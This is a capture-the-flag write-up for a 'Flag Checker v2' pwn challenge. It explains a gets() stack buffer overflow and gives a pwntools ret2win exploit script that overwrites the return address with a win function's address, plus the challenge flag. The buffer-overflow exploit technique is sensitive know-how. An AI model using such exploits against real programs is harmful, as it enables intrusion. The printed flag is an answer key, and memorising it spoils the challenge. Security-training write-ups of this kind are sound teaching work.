# Misc: Flag Checker v2 

**Author**: [redtrib3](https://github.com/redtrib3)
**Points**: 300
**Hint(s)**: https://ir0nstone.gitbook.io/notes/binexp/stack/return-oriented-programming/stack-alignment (50 pts)
**Flag**: `xploit{c0ntr0l_is_n0t_an_i11usion}`

**Challenge description:**
```
We made a flag checker (again), so that you can check if your flags are right.

**Connect:**<br>
`nc xploitctf.live 31337`
```

## Solve

This is a continuation of last year's crypto challenge flagCheckerv1 which involved a simple stack based buffer overflow.
When you check the provided source code, this is a similar challenge that uses `gets()`. gets() does not check for bounds and therefore will lead to bufferoverflow attacks.
The code has a interesting function get_flag() that reads flag from a env variable and prints it.

```c

void get_flag(){
    printf("\033[1;91m+---------[ FLAG! 🚩]----------+\033[0m\n");
    puts(getenv("Die_Flagge"));
}

```

Our aim is to overwrite the buffer, EBP and fill in the EIP with the memory address of this function, therefore getting the flag.
don't forget stack alignment since its a 64 bit system.

## Solve:
```python
## Exploit with right values for ret2win challenge

from pwn import *

binary = './FlagCheckerv2'
elf = ELF(binary)

offset = 344 # find by fuzzing
ret_gadget = 0x401016 # align the stack cause 64 bit
win_address = elf.symbols['get_flag']

payload = b'A' * offset + p64(ret_gadget) + p64(win_address)

local = 0

if local:
    conn = process(binary)
else:
    conn = remote('xploitctf.live',31337)

print("Sending payload...")
conn.sendline(payload)

# Interact with the shell (if successful)
conn.interactive()

```

